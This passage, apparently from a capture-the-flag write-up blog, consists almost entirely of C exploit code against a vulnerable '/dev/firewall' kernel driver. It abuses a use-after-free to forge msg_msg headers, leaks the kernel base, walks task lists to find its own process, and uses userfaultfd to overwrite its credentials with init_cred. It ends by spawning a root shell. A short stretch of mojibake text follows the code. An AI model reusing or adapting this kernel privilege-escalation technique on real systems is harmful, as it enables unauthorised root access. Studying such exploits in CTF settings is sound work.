class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_REGISTER 0xc020aa00</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_UNREGISTER 0x8010aa01</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_COPY 0xc028aa03</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_ZEROPAGE 0xc020aa04</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_WAKE 0x8010aa02</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INBOUND 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OUTBOUND 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SKIP -1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *page;</span><br><span class="line"><span class="keyword">size_t</span> page_size;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DESC_MAX 0x800</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> iface[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> ip[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> netmask[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> idx;</span><br><span class="line">    <span class="keyword">uint8_t</span> type;</span><br><span class="line">    <span class="keyword">uint16_t</span> proto;</span><br><span class="line">    <span class="keyword">uint16_t</span> port;</span><br><span class="line">    <span class="keyword">uint8_t</span> action;</span><br><span class="line">    <span class="keyword">char</span> desc[DESC_MAX];</span><br><span class="line">&#125; User_rule_t;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> iface[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> ip;</span><br><span class="line">    <span class="keyword">uint32_t</span> netmask;</span><br><span class="line">    <span class="keyword">uint16_t</span> proto;</span><br><span class="line">    <span class="keyword">uint16_t</span> port;</span><br><span class="line">    <span class="keyword">uint8_t</span> action;</span><br><span class="line">    <span class="keyword">uint8_t</span> is_duplicated;</span><br><span class="line">    <span class="keyword">char</span> desc[DESC_MAX];</span><br><span class="line">&#125; Rule_t;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125;msg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *ll_next;</span><br><span class="line">    <span class="keyword">void</span> *ll_prev;</span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;</span><br><span class="line">    <span class="keyword">void</span> *next;</span><br><span class="line">    <span class="keyword">void</span> *security;</span><br><span class="line">&#125;msg_header;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> target_addr=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> init_cred_addr=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> fd=<span class="number">0</span>;</span><br><span class="line">err_exit(<span class="keyword">char</span> *buf)&#123;</span><br><span class="line">    <span class="built_in">puts</span>(buf);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ioctl</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">unsigned</span> <span class="keyword">long</span> request, <span class="keyword">unsigned</span> <span class="keyword">long</span> param)</span> <span class="comment">//ioctl wrapper</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ioctl\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_ioctl, fd, request, param);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">pthread_t</span> monitor_thread;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">registerUserFaultFd</span><span class="params">(<span class="keyword">void</span> * addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">void</span> (*handler)(<span class="keyword">void</span>*))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    <span class="keyword">int</span> s;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">        err_exit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">        err_exit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_register.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">        err_exit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">    s = pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *) uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        err_exit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">fault_handler_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="keyword">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="keyword">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="built_in">memset</span>(page,<span class="number">0</span>,page_size);</span><br><span class="line">        <span class="built_in">memcpy</span>(page+ <span class="number">0x1000</span><span class="number">-0x30</span>,&amp;init_cred_addr,<span class="number">8</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(page+ <span class="number">0x1000</span><span class="number">-0x30</span>+<span class="number">8</span>,&amp;init_cred_addr,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">        msg_header fake_msg_header;</span><br><span class="line">        fake_msg_header.ll_next=(<span class="keyword">void</span> *)<span class="number">0x4141414141414141</span>;</span><br><span class="line">        fake_msg_header.ll_prev=(<span class="keyword">void</span> *)<span class="number">0x4242424242424242</span>;</span><br><span class="line">        fake_msg_header.m_ts=<span class="number">0x1000</span><span class="number">-0x30</span>+<span class="number">0x8</span>;</span><br><span class="line">        fake_msg_header.next=target_addr;</span><br><span class="line">        fake_msg_header.m_type=<span class="number">1</span>;</span><br><span class="line">        edit_rule(fd,&amp;fake_msg_header,<span class="number">1</span>,OUTBOUND,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            err_exit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                              ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;getshelling&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]----getshell ok&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_IPv4</span><span class="params">(<span class="keyword">uint32_t</span> ip,<span class="keyword">char</span> *ipv4)</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(ipv4,<span class="number">0</span>,<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d.%d.%d.%d\n&quot;</span>,(ip&amp;<span class="number">0xff</span>),(ip&amp;<span class="number">0x0000ff00</span>)&gt;&gt;<span class="number">8</span>,(ip&amp;<span class="number">0x00ff0000</span>)&gt;&gt;<span class="number">16</span>,(ip&amp;<span class="number">0xff000000</span>)&gt;&gt;<span class="number">24</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(ipv4,<span class="string">&quot;%d.%d.%d.%d&quot;</span>,(ip&amp;<span class="number">0xff</span>),(ip&amp;<span class="number">0x0000ff00</span>)&gt;&gt;<span class="number">8</span>,(ip&amp;<span class="number">0x00ff0000</span>)&gt;&gt;<span class="number">16</span>,(ip&amp;<span class="number">0xff000000</span>)&gt;&gt;<span class="number">24</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">User_rule_t* <span class="title">init_user_rule</span><span class="params">(<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type,<span class="keyword">u_int32_t</span> ip,<span class="keyword">u_int32_t</span> netmask)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    User_rule_t *user_rule=(User_rule_t *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(User_rule_t));</span><br><span class="line"></span><br><span class="line">    user_rule-&gt;idx=idx;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    get_IPv4(ip,&amp;(user_rule-&gt;ip));</span><br><span class="line"></span><br><span class="line">    get_IPv4(netmask,&amp;(user_rule-&gt;netmask));</span><br><span class="line"></span><br><span class="line">    user_rule-&gt;type=type;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;idx:%d\n&quot;</span>,user_rule-&gt;idx);</span><br><span class="line">    <span class="keyword">return</span> user_rule;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type)</span></span>&#123;</span><br><span class="line">    User_rule_t *<span class="keyword">user_rule_t</span>=init_user_rule(idx,type,<span class="number">0x11</span>,<span class="number">0x11</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;idx:%d\n&quot;</span>,<span class="keyword">user_rule_t</span>-&gt;idx);</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,ADD_RULE,<span class="keyword">user_rule_t</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;add fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type)</span></span>&#123;</span><br><span class="line">    User_rule_t *<span class="keyword">user_rule_t</span>=init_user_rule(idx,type,<span class="number">0x11</span>,<span class="number">0x11</span>);</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,DELETE_RULE,<span class="keyword">user_rule_t</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;del fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dup_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type)</span></span>&#123;</span><br><span class="line">    User_rule_t *<span class="keyword">user_rule_t</span>=init_user_rule(idx,type,<span class="number">0x11</span>,<span class="number">0x11</span>);</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,DUP_RULE,<span class="keyword">user_rule_t</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;edit fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">char</span> *buf,<span class="keyword">int</span> idx,<span class="keyword">int</span> type,<span class="keyword">int</span> flags)</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> ip=*(<span class="keyword">uint32_t</span> *)(buf+<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">uint32_t</span> netmask=*(<span class="keyword">uint32_t</span> *)(buf+<span class="number">0x24</span>);</span><br><span class="line">    User_rule_t *user_rule=init_user_rule(idx,type,ip,netmask);</span><br><span class="line">    <span class="built_in">memcpy</span>(user_rule,buf,<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">if</span>(!flags)&#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;(user_rule-&gt;ip),<span class="string">&quot;qqqqqqqqqq&quot;</span>,<span class="built_in">strlen</span>(<span class="string">&quot;qqqqqqqqqq&quot;</span>));</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;(user_rule-&gt;netmask),<span class="string">&quot;qqqqqqqqqq&quot;</span>,<span class="built_in">strlen</span>(<span class="string">&quot;qqqqqqqqqq&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,EDIT_RULE,user_rule);</span><br><span class="line">    <span class="comment">// if(ret&lt;0)&#123;</span></span><br><span class="line">    <span class="comment">//     err_exit(&quot;edit fail&quot;);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int32_t</span> <span class="title">make_queue</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> result;</span><br><span class="line">    <span class="keyword">if</span> ((result = msgget(key, msgflg)) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgget failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_msg</span><span class="params">(<span class="keyword">int</span> msqid,<span class="keyword">void</span> *msgp,<span class="keyword">size_t</span> msgsz,<span class="keyword">long</span> msgtype,<span class="keyword">int</span> msgflag)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret=msgrcv(msqid,msgp,msgsz,msgtype,msgflag);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;msgrcv fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_msg</span><span class="params">(<span class="keyword">int</span> msqid,<span class="keyword">void</span> *msgp,<span class="keyword">size_t</span> msgsz,<span class="keyword">int</span> msgflag)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret=msgsnd(msqid,msgp,msgsz,msgflag);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;msgsend fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> msg_id,size;</span><br><span class="line">    msg *msg_buff;</span><br><span class="line">    User_rule_t *<span class="keyword">user_rule_t</span>;</span><br><span class="line">    <span class="keyword">size_t</span> re_buf[<span class="number">0x2000</span>/<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">size_t</span> init_ipc_ns=<span class="number">0</span>,kernel_base=<span class="number">0</span>,init_task=<span class="number">0</span>,init_cred=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int32_t</span> pid;</span><br><span class="line">    <span class="keyword">uint64_t</span> prev, curr;</span><br><span class="line"></span><br><span class="line">    fd=open(<span class="string">&quot;/dev/firewall&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open dev/firewall fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    msg_buff=(msg *)<span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    page=<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    page_size=<span class="number">0x1000</span>;</span><br><span class="line">    add_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    dup_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line"></span><br><span class="line">    msg_id=make_queue(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">    msg_buff-&gt;mtype=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;(msg_buff-&gt;mtext),<span class="number">1</span>,<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(re_buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(re_buf));</span><br><span class="line">    del_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    send_msg(msg_id, msg_buff, <span class="number">0x1010</span> - <span class="number">0x30</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x50</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> shmid;</span><br><span class="line">        <span class="keyword">if</span> ((shmid = shmget(IPC_PRIVATE, <span class="number">100</span>, <span class="number">0600</span>)) == <span class="number">-1</span>) &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;shmget&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">char</span> *shmaddr = shmat(shmid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (shmaddr == (<span class="keyword">void</span>*)<span class="number">-1</span>) &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;shmat&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] get kernel_base_addr...\n&quot;</span>);</span><br><span class="line">    size=<span class="number">0x1500</span>;</span><br><span class="line">    msg_header fake_msg_header;</span><br><span class="line">    fake_msg_header.ll_next=(<span class="keyword">void</span> *)<span class="number">0x4141414141414141</span>;</span><br><span class="line">    fake_msg_header.ll_prev=(<span class="keyword">void</span> *)<span class="number">0x4242424242424242</span>;</span><br><span class="line">    fake_msg_header.m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header.m_ts=size;</span><br><span class="line">    edit_rule(fd,&amp;fake_msg_header,<span class="number">0</span>,OUTBOUND,<span class="number">0</span>);</span><br><span class="line">    get_msg(msg_id, re_buf, size, <span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x2000</span>/<span class="number">8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>((re_buf[i]&amp;<span class="number">0xfff</span>)==<span class="number">0x7a0</span>)&#123;</span><br><span class="line">            init_ipc_ns=re_buf[i];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_base = init_ipc_ns - <span class="number">0xc3d7a0</span>;</span><br><span class="line">    init_task = kernel_base + <span class="number">0xc124c0</span>;</span><br><span class="line">    init_cred = kernel_base + <span class="number">0xc33060</span>;</span><br><span class="line">    init_cred_addr=init_cred;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] init_ipc_ns: %p\n&quot;</span>, init_ipc_ns);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel_base: %p\n&quot;</span>, kernel_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] init_task: %p\n&quot;</span>, init_task);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] init_cred: %p\n&quot;</span>, init_cred);</span><br><span class="line">    <span class="built_in">memset</span>(re_buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(re_buf));</span><br><span class="line">    <span class="built_in">memset</span>((<span class="keyword">void</span> *)&amp;fake_msg_header,<span class="number">0</span>,<span class="keyword">sizeof</span>(msg_header));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] search this process task_struct\n&quot;</span>);</span><br><span class="line">    fake_msg_header.m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header.m_ts=size;</span><br><span class="line">    fake_msg_header.next=(<span class="keyword">void</span> *)init_task+<span class="number">0x290</span>;</span><br><span class="line">    edit_rule(fd,&amp;fake_msg_header,<span class="number">0</span>,OUTBOUND,<span class="number">1</span>);</span><br><span class="line">    get_msg(msg_id, re_buf, size, <span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="keyword">void</span>*)&amp;prev, (<span class="keyword">void</span> *)(((<span class="keyword">char</span> *)re_buf) + <span class="number">0xfe0</span>), <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="keyword">void</span>*)&amp;pid, (<span class="keyword">void</span> *)(((<span class="keyword">char</span> *)re_buf) + <span class="number">0x10d8</span>), <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, pid, getpid());</span><br><span class="line">    <span class="keyword">while</span>(pid!=getpid())&#123;</span><br><span class="line">        curr=prev<span class="number">-0x298</span>;</span><br><span class="line">        fake_msg_header.next=prev<span class="number">-0x8</span>;</span><br><span class="line">        edit_rule(fd,&amp;fake_msg_header,<span class="number">0</span>,OUTBOUND,<span class="number">1</span>);</span><br><span class="line">        get_msg(msg_id, re_buf, size, <span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="keyword">void</span>*)&amp;prev, (<span class="keyword">void</span> *)(((<span class="keyword">char</span> *)re_buf) + <span class="number">0xfe0</span>), <span class="number">8</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="keyword">void</span>*)&amp;pid, (<span class="keyword">void</span> *)(((<span class="keyword">char</span> *)re_buf) + <span class="number">0x10d8</span>), <span class="number">4</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, pid, getpid());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] get this process task_struct:%p\n&quot;</span>,curr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] now write for cred\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    add_rule(fd,<span class="number">1</span>,INBOUND);</span><br><span class="line">    dup_rule(fd,<span class="number">1</span>,INBOUND);</span><br><span class="line">    del_rule(fd,<span class="number">1</span>,INBOUND);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf=mmap(<span class="number">0x200000</span>,<span class="number">0x2000</span>,PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(!buf)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;mmap fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    msg_buff=<span class="number">0x200000</span>+<span class="number">0x1000</span><span class="number">-0x8</span>;</span><br><span class="line">    msg_buff-&gt;mtype=<span class="number">1</span>;</span><br><span class="line">    target_addr=curr + <span class="number">0x538</span> - <span class="number">0x8</span>;</span><br><span class="line">    size=<span class="number">0x1010</span>;</span><br><span class="line">    registerUserFaultFd(<span class="number">0x200000</span>+<span class="number">0x1000</span>,<span class="number">0x1000</span>,fault_handler_thread);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    send_msg(msg_id, msg_buff, size - <span class="number">0x30</span>, <span class="number">0</span>);</span><br><span class="line">    pthread_join(monitor_thread,<span class="literal">NULL</span>);</span><br><span class="line">    usr_shell();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ•ˆæœ</p>
